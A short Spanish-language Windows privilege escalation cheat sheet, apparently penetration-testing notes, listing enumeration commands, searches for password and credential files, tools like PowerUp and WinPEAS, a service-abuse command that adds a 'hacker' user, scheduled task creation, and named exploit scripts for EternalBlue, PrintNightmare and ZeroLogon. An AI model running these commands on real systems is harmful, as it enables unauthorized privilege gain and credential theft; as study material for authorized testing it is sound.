# ESCALADA DE PRIVILEGIOS EN WINDOWS

## 1. Información del Sistema

```powershell
# Información básica
systeminfo
hostname
whoami
whoami /priv

# Usuarios
net user
net localgroup administrators
Get-LocalUser

# Procesos
tasklist
Get-Process

# Conexiones
netstat -ano
Get-NetTCPConnection
```

## 2. Archivos Sensibles

```cmd
# Buscar archivos de configuración
dir /s *password* *config* *.xml *.ini

# Buscar archivos de credenciales
findstr /si password *.txt *.xml *.config
```

## 3. Herramientas de Escalada

```powershell
# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# PrivescCheck
.\PrivescCheck.ps1

# WinPEAS
.\winPEAS.exe
```

## 4. Técnicas Comunes

```cmd
# Service Abuse
sc qc <service>
sc config <service> binPath= "cmd.exe /c net user hacker pass /add"

# Registry Permissions
reg query HKLM\Software
reg query HKCU\Software

# Scheduled Tasks
schtasks /query /fo LIST
schtasks /create /tn <task> /tr <command> /sc once /st 00:00
```

## 5. Exploits Comunes

```cmd
# EternalBlue (MS17-010)
python eternalblue.py

# PrintNightmare (CVE-2021-34527)
python printnightmare.py

# ZeroLogon (CVE-2020-1472)
python zerologon.py
```
